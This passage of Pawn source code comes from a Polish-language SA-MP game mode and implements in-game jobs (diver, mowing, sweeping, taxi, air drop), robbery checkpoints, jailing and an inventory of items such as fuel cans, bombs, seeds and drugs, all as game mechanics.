	        TrawaCoords[playerid][1][13] = -87.6196130;
	        TrawaCoords[playerid][2][13] = 3.1171870;
	    	TrawaO[playerid] = CreateDynamicObject(811,-12.4005200,-87.6196130,3.1171870,0.0000000,0.0000000,0.0000000, playerid + 31); //
	    }
	    case 14:
	    {
	        AktywnaTrawa[playerid] = 14;
	        TrawaCoords[playerid][0][14] = -42.4788580;
	        TrawaCoords[playerid][1][14] = -85.8435280;
	        TrawaCoords[playerid][2][14] = 3.1171870;
	    	TrawaO[playerid] = CreateDynamicObject(811,-42.4788580,-85.8435280,3.1171870,0.0000000,0.0000000,0.0000000, playerid + 31); //
	    }
	    case 15:
	    {
	        AktywnaTrawa[playerid] = 15;
	        TrawaCoords[playerid][0][15] = -4.1732130;
	        TrawaCoords[playerid][1][15] = -100.7398450;
	        TrawaCoords[playerid][2][15] = 2.6071870;
	    	TrawaO[playerid] = CreateDynamicObject(811,-4.1732130,-100.7398450,2.6071870,0.0000000,0.0000000,0.0000000, playerid + 31); //
	    }
	    case 16:
	    {
	        AktywnaTrawa[playerid] = 16;
	        TrawaCoords[playerid][0][16] = 24.5793970;
	        TrawaCoords[playerid][1][16] = -90.2396390;
	        TrawaCoords[playerid][2][16] = 1.4211350;
	    	TrawaO[playerid] = CreateDynamicObject(811,24.5793970,-90.2396390,1.4211350,0.0000000,0.0000000,0.0000000, playerid + 31); //
	    }
	    case 17:
	    {
	        AktywnaTrawa[playerid] = 17;
	        TrawaCoords[playerid][0][17] = 47.7014230;
	        TrawaCoords[playerid][1][17] = -96.3650200;
	        TrawaCoords[playerid][2][17] = 0.6168530;
	    	TrawaO[playerid] = CreateDynamicObject(811,47.7014230,-96.3650200,0.6168530,0.0000000,0.0000000,0.0000000, playerid + 31); //
	    }
	}
}

forward ZbierzPaczke(playerid);
public ZbierzPaczke(playerid)
{
	if(IsPlayerInRangeOfPoint(playerid, 2.0, PaczkaX[playerid], PaczkaY[playerid], PaczkaZ[playerid]))
	{
	    if(NaNurku[playerid] && Paczka[playerid] > 0)
	    {
			Paczka[playerid] = 0;
			DestroyPickup(NurekPickup[playerid]);
			ZebranePaczki[playerid]++;
			LosujPaczke(playerid);
	    }
	}
}

forward LosujPaczke(playerid);
public LosujPaczke(playerid)
{
	switch(random(12))
	{
		case 0:
		{
		    Paczka[playerid] = 1;
		    PaczkaX[playerid] = -487.6498;
			PaczkaY[playerid] = 2175.8608;
			PaczkaZ[playerid] = 29.9843;
		}
		case 1:
		{
		    Paczka[playerid] = 2;
		    PaczkaX[playerid] = -494.6595;
			PaczkaY[playerid] = 2181.2021;
			PaczkaZ[playerid] = 24.3734;
		}
		case 2:
		{
		    Paczka[playerid] = 3;
		    PaczkaX[playerid] = -504.8499;
			PaczkaY[playerid] = 2218.7495;
			PaczkaZ[playerid] = 20.4767;
		}
		case 3:
		{
		    Paczka[playerid] = 4;
		    PaczkaX[playerid] = -523.9414;
			PaczkaY[playerid] = 2206.6826;
  			PaczkaZ[playerid] = 18.6985;
		}
		case 4:
		{
		    Paczka[playerid] = 5;
		    PaczkaX[playerid] = -522.9428;
			PaczkaY[playerid] = 2200.1504;
			PaczkaZ[playerid] = 21.4391;
		}
		case 5:
		{
		    Paczka[playerid] = 6;
		    PaczkaX[playerid] = -534.0082;
			PaczkaY[playerid] = 2168.7764;
			PaczkaZ[playerid] = 20.5939;
		}
		case 6:
		{
		    Paczka[playerid] = 7;
		    PaczkaX[playerid] = -524.9029;
			PaczkaY[playerid] = 2286.0337;
			PaczkaZ[playerid] = 37.4401;
		}
		case 7:
		{
		    Paczka[playerid] = 8;
		    PaczkaX[playerid] = -581.9014;
			PaczkaY[playerid] = 2232.5911;
			PaczkaZ[playerid] = 19.3674;
		}
		case 8:
		{
		    Paczka[playerid] = 9;
		    PaczkaX[playerid] = -574.9539;
			PaczkaY[playerid] = 2216.1057;
			PaczkaZ[playerid] = 22.8546;
		}
		case 9:
		{
		    Paczka[playerid] = 10;
		    PaczkaX[playerid] = -525.51424;
			PaczkaY[playerid] = 2142.8403;
			PaczkaZ[playerid] = 38.6375;
		}
		case 10:
		{
		    Paczka[playerid] = 11;
		    PaczkaX[playerid] = -534.0889;
			PaczkaY[playerid] = 2150.5005;
			PaczkaZ[playerid] = 20.2223;
		}
		case 11:
		{
		    Paczka[playerid] = 12;
		    PaczkaX[playerid] = -551.9014;
			PaczkaY[playerid] = 2190.5942;
			PaczkaZ[playerid] = 37.5797;
		}
	}
	NurekPickup[playerid] = CreatePickup(1279, 1, PaczkaX[playerid], PaczkaY[playerid], PaczkaZ[playerid], 80 + playerid);
}

public OnPlayerEnterDynamicCP(playerid, checkpointid)
{
	Loop(napad, MAX_NAPADY)
	{
	    if(checkpointid == NapadCP[napad] && NAtt[napad] && NapadID[playerid] == -1 && !GetPlayerVirtualWorld(playerid)) {
	    	Sound(playerid, 1057, 0.0, 0.0, 0.0);
	        NAtt[napad] = false;
			NapadID[playerid] = napad;
			NapadTime[napad] = 180;
		    BlockNapad(napad);
			new napadstr[256];
			Atakuje[napad] = playerid;
			format(napadstr, sizeof(napadstr), ""C_NICK"%s(%d) "C_WHITE"rozpocz¹³ napad na {6efc58}%s"C_WHITE".", Player[playerid][Name], playerid, NapadName[napad]);
			SendClientMessageToAll(-1, napadstr);
			SendClientMessage(playerid, -1, "{6efc58}Pozostañ w miejscu napadu i nie daj siê zabiæ przez innych graczy."); }
	}
}

public OnPlayerEnterCheckpoint(playerid)
{
	if(NaNurku[playerid] && ZebranePaczki[playerid] > 0) {
	    new expfp = ZebranePaczki[playerid] * 15;
		AddExp(playerid, expfp);
		new nurekstr[256];
		format(nurekstr, sizeof(nurekstr), ""PYTAJNIK""C_ORANGE"Zebrane paczki: "C_WHITE"%d"C_ORANGE". Otrzymano "C_WHITE"%d "C_ORANGE"EXP.", ZebranePaczki[playerid], expfp);
		ZebranePaczki[playerid] = 0;
		SendClientMessage(playerid, -1, nurekstr); }
	if(NaCzyszczeniu[playerid]) {
		AddExp(playerid, random(40) + 4);
		LosLSCP(playerid); }
	if(NaZbieraniu[playerid]) {
		AddExp(playerid, random(30) + 3);
		LosLSCP(playerid);
		TogglePlayerControllable(playerid, 0);
		return SetTimerEx("unfreezePlayer", 1500, 0, "i", playerid); }
	if(IsTaksowkarz[playerid] == 1)
	{
		DisablePlayerCheckpoint(playerid);
		switch(random(13)) {
			case 0: SetPlayerCheckpoint(playerid, -1901.0497,972.4885,35.0222, 1.5);
			case 1: SetPlayerCheckpoint(playerid, -2198.8884,571.4172,35.0156, 1.5);
			case 2: SetPlayerCheckpoint(playerid, -2255.1787,122.3290,35.1719, 1.5);
			case 3: SetPlayerCheckpoint(playerid, -2610.9382,-208.0437,4.1797, 1.5);
			case 4: SetPlayerCheckpoint(playerid, -2497.0374,-370.1039,62.3952, 1.5);
			case 5: SetPlayerCheckpoint(playerid, -2368.9817,-89.5770,35.1719, 1.5);
			case 6: SetPlayerCheckpoint(playerid, -2223.9058,491.9576,35.0156, 1.5);
			case 7: SetPlayerCheckpoint(playerid, -2191.5938,1091.5773,79.8516, 1.5);
			case 8: SetPlayerCheckpoint(playerid, -1967.7295,1172.2928,45.2969, 1.5);
			case 9: SetPlayerCheckpoint(playerid, -1564.5514,657.9337,7.0391, 1.5);
			case 10: SetPlayerCheckpoint(playerid, -2096.7700,-289.5799,35.4219, 1.5);
			case 11: SetPlayerCheckpoint(playerid, -2905.5164,-1079.7648,9.4844, 1.5);
			case 12: SetPlayerCheckpoint(playerid, -2655.2495,-90.0605,4.0959, 1.5); }
		IsTaksowkarz[playerid] = 2;
    	SendClientMessage(playerid, -1, ""PYTAJNIK""C_ORANGE"Dostarcz klienta do {FF0000}czerwonego punktu"C_ORANGE" na mapie.");
		return DestroyActor(TaxiActor[playerid]);
	}
	if(IsTaksowkarz[playerid] == 2) {
	    ZakonczTaksowkarz(playerid);
	    new scoretaxi = random(80) + 20;
	    new ends[256];
 		format(ends, sizeof(ends), ""PYTAJNIK""C_NICK"%s(%d) {F9C05C}dostarczy³ klienta na miejsce. ("C_WHITE"%d EXP{F9C05C})", Player[playerid][Name], playerid, scoretaxi);
		SendClientMessageToAll(-1, ends); }
    return 1;
}

forward LosLSCP(playerid);
public LosLSCP(playerid)
{
	switch(random(19)) {
	case 0: SetPlayerCheckpoint(playerid, 2342.8306,-1701.6499,13.3594, 1.5);
	case 1: SetPlayerCheckpoint(playerid, 2158.5781,-1752.3849,13.3808, 1.5);
	case 2: SetPlayerCheckpoint(playerid, 2212.6343,-1482.9943,23.8281, 1.5);
	case 3: SetPlayerCheckpoint(playerid, 2342.5552,-1529.7827,23.8468, 1.5);
	case 4: SetPlayerCheckpoint(playerid, 2273.5591,-1584.4730,3.2021, 1.5);
	case 5: SetPlayerCheckpoint(playerid, 1987.1271,-1443.6096,13.3998, 1.5);
	case 6: SetPlayerCheckpoint(playerid, 2131.0798,-1406.9592,23.8359, 1.5);
	case 7: SetPlayerCheckpoint(playerid, 2069.1711,-1360.4474,23.8179, 1.5);
	case 8: SetPlayerCheckpoint(playerid, 2212.0076,-1300.8282,23.8203, 1.5);
	case 9: SetPlayerCheckpoint(playerid, 2370.9958,-1384.5931,23.8589, 1.5);
	case 10: SetPlayerCheckpoint(playerid, 2431.0110,-1512.6287,23.8433, 1.5);
	case 11: SetPlayerCheckpoint(playerid, 2543.5256,-1732.3348,13.3828, 1.5);
	case 12: SetPlayerCheckpoint(playerid, 2642.8503,-1554.0538,20.3237, 1.5);
	case 13: SetPlayerCheckpoint(playerid, 2388.7092,-1256.7668,23.8271, 1.5);
	case 14: SetPlayerCheckpoint(playerid, 2222.3057,-1260.1016,23.9048, 1.5);
	case 15: SetPlayerCheckpoint(playerid, 1849.3525,-1396.7008,13.3906, 1.5);
	case 16: SetPlayerCheckpoint(playerid, 2041.6801,-1586.2253,12.8991, 1.5);
	case 17: SetPlayerCheckpoint(playerid, 2146.0840,-1894.4806,13.3828, 1.5);
	case 18: SetPlayerCheckpoint(playerid, 1740.4679,-2166.5200,13.4608, 1.5); }
}

forward EndNurek(playerid);
public EndNurek(playerid)
{
	if(Paczka[playerid] > 0) DestroyPickup(NurekPickup[playerid]);
	DisablePlayerCheckpoint(playerid);
	NaNurku[playerid] = false;
	ZebranePaczki[playerid] = 0;
	SetPlayerVirtualWorld(playerid, 0);
	RemovePlayerAttachedObject(playerid, 1);
	SpawnPlayer(playerid);
	SpawnFunction(playerid);
	return 1;
}

forward Nurek(playerid);
public Nurek(playerid)
{
	ResetPlayerWeapons(playerid);
	ZebranePaczki[playerid] = 0;
	NaNurku[playerid] = true;
	SetPlayerVirtualWorld(playerid, 80 + playerid);
	SetPlayerPos(playerid,-480.4381,2178.8684,41.8599);
 	SetPlayerCheckpoint(playerid, -480.2491,2194.4744,41.8599, 2.0);
	LosujPaczke(playerid);
	SendClientMessage(playerid, -1, ""PYTAJNIK""C_ORANGE"Wp³ywaj w paczki znajduj¹ce siê w wodzie, po czym oddawaj je do {FF0000}czerwonego punktu"C_ORANGE".");
	SendClientMessage(playerid, RED, "Praca nurka zakoñczy siê po utoniêciu lub po wpisaniu "C_WHITE"/leave"C_RED".");
	SetPlayerAttachedObject(playerid, 1, 19816, 2, -0.353000, -0.154000, 0.060999, -10.599995, 82.100044, -3.200003);
}

forward WyznaczStrefeZrzutu(playerid);
public WyznaczStrefeZrzutu(playerid)
{
	StrefaZrzutu[playerid][0] = random(2700);
	StrefaZrzutu[playerid][1] = random(2000);
	StrefaZrzutu[playerid][2] = random(30);
	StrefaZrzutuRadar[playerid] = GangZoneCreate(StrefaZrzutu[playerid][0] + 62, StrefaZrzutu[playerid][1] - 99, StrefaZrzutu[playerid][0] - 58, StrefaZrzutu[playerid][1] + 112);
	GangZoneShowForPlayer(playerid, StrefaZrzutuRadar[playerid], 0xFF000096);
    SetPlayerMapIcon(playerid, 0, StrefaZrzutu[playerid][0], StrefaZrzutu[playerid][1], StrefaZrzutu[playerid][2], 19, 0, MAPICON_GLOBAL);
	SetPlayerRaceCheckpoint(playerid, 3, StrefaZrzutu[playerid][0], StrefaZrzutu[playerid][1], StrefaZrzutu[playerid][2], StrefaZrzutu[playerid][0], StrefaZrzutu[playerid][1], StrefaZrzutu[playerid][2], 7);
	new msgstr[256];
	format(msgstr, sizeof(msgstr), ""PLUS""C_LOLIVE"Zrzuæ paczkê nad {FF0000}czerwonym punktem "C_LOLIVE"zaznaczonym na mapie naciskaj¹c klawisz {FF0000}N"C_LOLIVE".");
	SendClientMessage(playerid, -1, msgstr);
}

forward ZrzutPaczki(playerid);
public ZrzutPaczki(playerid)
{
	SetPlayerVirtualWorld(playerid, playerid + 33);
    NaZrzucie[playerid] = true;
    ResetPlayerWeapons(playerid);
	SetPlayerPos(playerid,-1465.2222,-99.3890,14.1484);
	SamolotZ[playerid] = CreateVehicle(476, -1465.2985,-99.4635,14.8730,316.5769, -1, 7, 6);
	SetVehicleVirtualWorld(SamolotZ[playerid], playerid + 33);
    PutPlayerInVehicle(playerid, SamolotZ[playerid], 0);
	WyznaczStrefeZrzutu(playerid);
	return 1;
}

forward ZakonczZrzut(playerid);
public ZakonczZrzut(playerid)
{
	NaZrzucie[playerid] = false;
	DestroyVehicle(SamolotZ[playerid]);
	SetPlayerVirtualWorld(playerid, 0);
	GangZoneHideForPlayer(playerid,StrefaZrzutuRadar[playerid]);
	RemovePlayerMapIcon(playerid, 0);
	DisablePlayerRaceCheckpoint(playerid);
	SpawnFunction(playerid);
	return 1;
}

forward ZakonczZbieranie(playerid);
public ZakonczZbieranie(playerid)
{
	NaZbieraniu[playerid] = false;
	DisableRemoteVehicleCollisions(playerid, 0);
	DestroyVehicle(Sweeper[playerid]);
	DisablePlayerCheckpoint(playerid);
	SetPlayerVirtualWorld(playerid, 0);
	SpawnFunction(playerid);
	return 1;
}

forward ZakonczCzyszczenie(playerid);
public ZakonczCzyszczenie(playerid)
{
	NaCzyszczeniu[playerid] = false;
    DisableRemoteVehicleCollisions(playerid, 0);
	DestroyVehicle(Sweeper[playerid]);
	DisablePlayerCheckpoint(playerid);
	SetPlayerVirtualWorld(playerid, 0);
	SpawnFunction(playerid);
	return 1;
}

forward ZakonczKoszenie(playerid);
public ZakonczKoszenie(playerid)
{
	NaKoszeniu[playerid] = false;
	DestroyVehicle(Kosiarka[playerid]);
	SetPlayerVirtualWorld(playerid, 0);
	DestroyDynamicObject(TrawaO[playerid]);
	SpawnFunction(playerid);
	return 1;
}

forward Koszenie(playerid);
public Koszenie(playerid)
{
	SetPlayerVirtualWorld(playerid, playerid + 31);
    NaKoszeniu[playerid] = true;
    ResetPlayerWeapons(playerid);
	SetPlayerPos(playerid,-0.6965,0.9362,3.1172);
	Kosiarka[playerid] = CreateVehicle(572,-0.6965,0.9362,3.1172,152.5365, -1, 1, 1);
	SetVehicleVirtualWorld(Kosiarka[playerid], playerid + 31);
    PutPlayerInVehicle(playerid, Kosiarka[playerid], 0);
    TrawaResp(playerid);
    ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""C_GREEN"Koszenie trawy", ""C_BLUE1"Witaj! Wypada³oby, abyœ skosi³ parê krzaków z tego pola.\nWje¿d¿aj kosiark¹ w pola, aby je skosiæ.\n\nZa ka¿de pojedyncze skoszenie otrzymasz "C_WHITE"2 EXP"C_BLUE1".\n\n"C_GREEN"Powodzenia!", "Zamknij", "");
	return 1;
}

forward Zbieranie(playerid);
public Zbieranie(playerid)
{
	LosLSCP(playerid);
	SetPlayerVirtualWorld(playerid, 61);
	DisableRemoteVehicleCollisions(playerid, 1);
    NaZbieraniu[playerid] = true;
    ResetPlayerWeapons(playerid);
	Sweeper[playerid] = CreateVehicle(408,2437.2234,-1659.0007,13.9011,89.0184, -1, 1, 1);
	SetVehicleNumberPlate(Sweeper[playerid], "{6ba7d6}Impreza");
	SetVehicleVirtualWorld(Sweeper[playerid], 61);
    PutPlayerInVehicle(playerid, Sweeper[playerid], 0);
	LosLSCP(playerid);
	return 1;
}

forward JailPlayer(jailername[], playerid, reason[], time);
public JailPlayer(jailername[], playerid, reason[], time)
{
    new msgs[256];
	format(msgs, sizeof(msgs), ""C_NICK"%s "C_RED"uwiêzi³ "C_NICK"%s(%d) "C_RED"("C_WHITE"%s, %s"C_RED")", jailername, Player[playerid][Name], playerid, TimeConvert(time), reason);
 	SendClientMessageToAll(WHITE, msgs);
 	JailTimeP[playerid] += time;
  	Player[playerid][Cash] -= 50000;
  	if(Player[playerid][Cash] < 0) Player[playerid][Cash] = 0;
 	new tdstrr[256];
 	format(tdstrr, sizeof(tdstrr), "~w~Wrocisz na wolnosc za ~r~~h~%s~w~.", TimeConvert(time));
	PlayerTextDrawSetString(playerid, JailTime[playerid], tdstrr);
	PlayerTextDrawShow(playerid, JailTime[playerid]);
 	ResetPlayerWeapons(playerid);
 	SetPlayerHealth(playerid, 100.0);
 	SetPlayerArmour(playerid, 100.0);
 	SetPlayerVirtualWorld(playerid, 200);
 	switch(random(3)) {
 	    case 0: SetPlayerPos(playerid, 1166.5769,696.4439,10.6815);
	 	case 1: SetPlayerPos(playerid, 1153.1829,692.5233,10.8775);
		case 2: SetPlayerPos(playerid, 1084.8163,692.3231,10.3064); }
 	if(pAch[playerid][16] < 1) {
		pAch[playerid][16] = 1;
		AddExp(playerid, 200);
		Sound(playerid,1137,0.0,0.0,0.0);
		SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Za kratami", "New achievement: "C_NICK"Za kratami"); }
	return 1;
}

forward CreateTaxiActor(playerid);
public CreateTaxiActor(playerid)
{
	switch(random(12))
	{
		case 0: {
		    TaxiActor[playerid] = CreateActor(random(300),-2012.3586,82.1940,27.6875,270.9779);
		    SetPlayerCheckpoint(playerid, -2009.5536,81.9372,27.5391, 1.5); }
		case 1: {
		    TaxiActor[playerid] = CreateActor(random(300),-2151.3862,36.5396,35.3203,177.4169);
		    SetPlayerCheckpoint(playerid, -2151.3862,36.5396,35.3203, 1.5); }
		case 2: {
		    TaxiActor[playerid] = CreateActor(random(300),-2295.8240,-64.9695,35.3203,177.3767);
		    SetPlayerCheckpoint(playerid, -2295.9246,-67.1741,35.1641, 1.5); }
		case 3: {
		    TaxiActor[playerid] = CreateActor(random(300),-2400.4863,303.2299,35.1719,51.0352);
		    SetPlayerCheckpoint(playerid, -2402.2388,304.3745,35.0156, 1.5); }
		case 4: {
		    TaxiActor[playerid] = CreateActor(random(300),-2378.8843,690.4254,35.1719,91.7972);
		    SetPlayerCheckpoint(playerid, -2380.7903,690.2655,35.0156, 1.5); }
		case 5: {
		    TaxiActor[playerid] = CreateActor(random(300),-2440.1970,713.6289,35.1719,177.2676);
		    SetPlayerCheckpoint(playerid, -2440.2871,711.7640,35.0137, 1.5); }
		case 6: {
		    TaxiActor[playerid] = CreateActor(random(300),-2631.7991,573.5479,14.6094,178.4090);
		    SetPlayerCheckpoint(playerid, -2631.7903,571.7751,14.4609, 1.5); }
		case 7: {
		    TaxiActor[playerid] = CreateActor(random(300),-2814.8770,-75.3695,7.1797,269.3815);
		    SetPlayerCheckpoint(playerid, -2812.6760,-75.3933,7.0313, 1.5); }
		case 8: {
		    TaxiActor[playerid] = CreateActor(random(300),-2713.6160,-301.5386,7.1875,54.7167);
		    SetPlayerCheckpoint(playerid, -2714.6445,-300.6753,7.0391, 1.5); }
		case 9: {
		    TaxiActor[playerid] = CreateActor(random(300),-2598.9221,143.4947,4.3359,86.6856);
		    SetPlayerCheckpoint(playerid, -2600.7368,143.5998,4.1797, 1.5); }
		case 10: {
		    TaxiActor[playerid] = CreateActor(random(300),-2745.7061,949.1379,54.4609,90.9244);
		    SetPlayerCheckpoint(playerid, -2746.7986,949.1202,54.3047, 1.5); }
		case 11: {
		    TaxiActor[playerid] = CreateActor(random(300),-2512.1907,1123.4653,55.7266,180.8775);
		    SetPlayerCheckpoint(playerid, -2512.1650,1121.7371,55.5781, 1.5); }
	}
	SetActorVirtualWorld(TaxiActor[playerid], 68 + playerid);
}

forward ZakonczTaksowkarz(playerid);
public ZakonczTaksowkarz(playerid)
{
	SetPlayerVirtualWorld(playerid, 0);
    IsTaksowkarz[playerid] = 0;
	DestroyVehicle(TaxiCar[playerid]);
	DisablePlayerCheckpoint(playerid);
	DestroyActor(TaxiActor[playerid]);
	SpawnFunction(playerid);
	return 1;
}

forward Taksowkarz(playerid);
public Taksowkarz(playerid)
{
	SetPlayerVirtualWorld(playerid, 68 + playerid);
    IsTaksowkarz[playerid] = 1;
    ResetPlayerWeapons(playerid);
	TaxiCar[playerid] = CreateVehicle(420,-1993.6455,150.0527,27.3186,180.2398, -1, 6, 6);
	SetVehicleNumberPlate(TaxiCar[playerid], "{6ba7d6}Impreza");
	SetVehicleVirtualWorld(TaxiCar[playerid], 68 + playerid);
    PutPlayerInVehicle(playerid, TaxiCar[playerid], 0);
    SendClientMessage(playerid, -1, ""PYTAJNIK""C_ORANGE"Udaj siê po klienta do {FF0000}czerwonego punktu"C_ORANGE" na mapie.");
    CreateTaxiActor(playerid);
	return 1;
}

forward Czyszczenie(playerid);
public Czyszczenie(playerid)
{
	LosLSCP(playerid);
	SetPlayerVirtualWorld(playerid, 61);
	DisableRemoteVehicleCollisions(playerid, 1);
    NaCzyszczeniu[playerid] = true;
    ResetPlayerWeapons(playerid);
	Sweeper[playerid] = CreateVehicle(574,2437.2234,-1659.0007,13.9011,89.0184, -1, 1, 1);
	SetVehicleNumberPlate(Sweeper[playerid], "{6ba7d6}Impreza");
	SetVehicleVirtualWorld(Sweeper[playerid], 61);
    PutPlayerInVehicle(playerid, Sweeper[playerid], 0);
	LosLSCP(playerid);
	return 1;
}

forward UseItem(playerid,slotid);
public UseItem(playerid, slotid)
{
	new ItemName[256][8];
	if(slotid == 1) format(ItemName[slotid], 256, "%s", Player[playerid][ItemName1]);
	if(slotid == 2) format(ItemName[slotid], 256, "%s", Player[playerid][ItemName2]);
	if(slotid == 3) format(ItemName[slotid], 256, "%s", Player[playerid][ItemName3]);
	if(slotid == 4) format(ItemName[slotid], 256, "%s", Player[playerid][ItemName4]);
	if(slotid == 5) format(ItemName[slotid], 256, "%s", Player[playerid][ItemName5]);
	if(slotid == 6) format(ItemName[slotid], 256, "%s", Player[playerid][ItemName6]);
	if(slotid == 7) format(ItemName[slotid], 256, "%s", Player[playerid][ItemName7]);
	if(slotid == 8) format(ItemName[slotid], 256, "%s", Player[playerid][ItemName8]);
	if(CompareEx(ItemName[slotid],"Brak")) return SendClientMessage(playerid, RED, ""C_RED"Wybrany slot jest pusty.");
	if(CompareEx(ItemName[slotid],"{68A028}Kanister paliwa"))
	{
	    if(!HavePrivcar[playerid]) return SendClientMessage(playerid, RED, ""C_RED"Nie posiadasz prywatnego pojazdu.");
 		Loop(privcarid, privcars)
		{
	 		if(pOwner[privcarid] == Player[playerid][ID])
   			{
   			    if(pFuel[privcarid] > 0.0) return SendClientMessage(playerid, RED, ""C_RED"Kanistrem mo¿esz zatankowaæ jedynie pusty bak.");
   			    pFuel[privcarid] = 50.0;
				new tdstr[256];
				if(pFuelT[privcarid] == 0) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(95, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
				if(pFuelT[privcarid] == 1) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(98, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
				if(pFuelT[privcarid] == 2) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(ON, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
				if(pFuelT[privcarid] == 3) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(LPG, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
				Update3DTextLabelText(pText[privcarid], -1, tdstr);
	    		return RemoveItem(playerid,"{68A028}Kanister paliwa", 1);
			}
		}
	}
	if(CompareEx(ItemName[slotid],"{AFAFAF}Bomba"))
	{
		if(OnNonDM[playerid]) return DialogError(playerid, "{FFFF00}Podk³adanie bomb w tym miejscu jest niemo¿liwe.");
		if(BombArmed[playerid]) return SendClientMessage(playerid, RED, "Mo¿esz pod³o¿yæ tylko jedn¹ bombê naraz!");
	    new prstr[128];
	    format(prstr, sizeof(prstr), "[bomb] %s (id %d) planted", Player[playerid][Name], playerid);
	    print(prstr);
		GetPlayerPos(playerid, BombX[playerid], BombY[playerid], BombZ[playerid]);
		GetXYInFrontOfPlayer(playerid, BombX[playerid], BombY[playerid], 0.7);
		ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0, 0, 0);
		BombObject[playerid] = CreateDynamicObject(1252, BombX[playerid], BombY[playerid], BombZ[playerid] - 0.8,270,0,0);
		SetTimerEx("BombTimer",10000, 0, "d", playerid);
		BombArmed[playerid] = true;
		RemoveItem(playerid, "{AFAFAF}Bomba", 1);
 		if(pAch[playerid][7] < 1) {
			pAch[playerid][7] = 1;
			AddExp(playerid, 200);
			Sound(playerid,1137,0.0,0.0,0.0);
			SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Terrorysta", "New achievement: "C_NICK"Terrorysta"); }
	}
	if(CompareEx(ItemName[slotid],""C_GREEN"Nasiona"))
	{
		if(OnNonDM[playerid] || GetPlayerState(playerid)!=PLAYER_STATE_ONFOOT || GetPlayerInterior(playerid)) return DialogError(playerid, "{FFFF00}Sadzenie w tym miejscu jest niemo¿liwe.");
		if(nPlayer[playerid][pZasadzone] == 0)
		{
		    RemoveItem(playerid, ""C_GREEN"Nasiona", 1);
			new Float:X,Float:Y,Float:Z;
			ApplyAnimation(playerid, "BOMBER","BOM_Plant_In",4.0,0,0,0,0,0);
			SetTimerEx("ZbierzUP3DText", 600000, false, "i", playerid);
			GetPlayerPos(playerid, X, Y, Z);
			nPlayer[playerid][pObiektPlantu] = CreateObject(862, X, Y, Z-1.0, 0, 0, 0, 0);
			new rosstr[256];
			format(rosstr, sizeof(rosstr), ""C_GREEN"Plantacja roœliny "C_WHITE"%s\n"C_RED"Nie jest gotowa.", Player[playerid][Name]);
			nPlayer[playerid][nLabel] = Create3DTextLabel(rosstr,0xFFFFFFFF,X,Y,Z,20.0,0);
			nPlayer[playerid][pLabels]++;
			nPlayer[playerid][pPlantacjaX] = X;
			nPlayer[playerid][pPlantacjaY] = Y;
			nPlayer[playerid][pPlantacjaZ] = Z;
			nPlayer[playerid][pZasadzone] = 1;
		}
		else return DialogError(playerid, "{FFFF00}Posiadasz ju¿ zasadzon¹ jedn¹ roœlinê.");
	}
	if(CompareEx(ItemName[slotid],"{AE00FF}Narkotyk")) {
		if(nPlayer[playerid][pPodWplywem] != 1) {
	    	RemoveItem(playerid, "{AE00FF}Narkotyk", 1);
			SetPlayerWeather(playerid, -66);
			SetPlayerDrunkLevel(playerid, 180000);
			SetPlayerHealth(playerid, 100);
			SetPlayerTime(playerid,12,00);
			SetPlayerSpecialAction(playerid, SPECIAL_ACTION_SMOKE_CIGGY);
			SetTimerEx("zwyklyStan", 180000, false, "i", playerid);
			nPlayer[playerid][pPodWplywem] = 1;
			if(pAch[playerid][20] < 1) {
				pAch[playerid][20] = 1;
				AddExp(playerid, 200);
				Sound(playerid,1137,0.0,0.0,0.0);
				SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Narkoman", "New achievement: "C_NICK"Narkoman"); } }
		else return DialogError(playerid, "{FFFF00}Obecnie jesteœ ju¿ pod wp³ywem."); }
	if(CompareEx(ItemName[slotid],"{FFFFFF}Karta kolekcjonerska")) ShowPlayerDialog(playerid, DIALOG_KARTA, DIALOG_STYLE_LIST, "Karta kolekcjonerska - wybierz nagrodê", ""C_WHITE"Ukryta 1\nUkryta 2\nUkryta 3\n200 EXP\n15000$", "Wybierz", "");
	return 1;
}

stock PlayerHaveItem(playerid,item[])
{
	if(CompareEx(Player[playerid][ItemName1], item)) return 1;
	if(CompareEx(Player[playerid][ItemName2], item)) return 1;
	if(CompareEx(Player[playerid][ItemName3], item)) return 1;
	if(CompareEx(Player[playerid][ItemName4], item)) return 1;
	if(CompareEx(Player[playerid][ItemName5], item)) return 1;
	if(CompareEx(Player[playerid][ItemName6], item)) return 1;
	if(CompareEx(Player[playerid][ItemName7], item)) return 1;
	if(CompareEx(Player[playerid][ItemName8], item)) return 1;
	return 0;
}

stock AddItem(playerid,item[],amount)
{
	if(!Player[playerid][IsLoggedIn]) return 1;
	eq++;
	if(CompareEx(Player[playerid][ItemName1],item)) return Player[playerid][ItemAmount1] += amount;
	if(CompareEx(Player[playerid][ItemName2],item)) return Player[playerid][ItemAmount2] += amount;
	if(CompareEx(Player[playerid][ItemName3],item)) return Player[playerid][ItemAmount3] += amount;
	if(CompareEx(Player[playerid][ItemName4],item)) return Player[playerid][ItemAmount4] += amount;
	if(CompareEx(Player[playerid][ItemName5],item)) return Player[playerid][ItemAmount5] += amount;
	if(CompareEx(Player[playerid][ItemName6],item)) return Player[playerid][ItemAmount6] += amount;
	if(CompareEx(Player[playerid][ItemName7],item)) return Player[playerid][ItemAmount7] += amount;
	if(CompareEx(Player[playerid][ItemName8],item)) return Player[playerid][ItemAmount8] += amount;
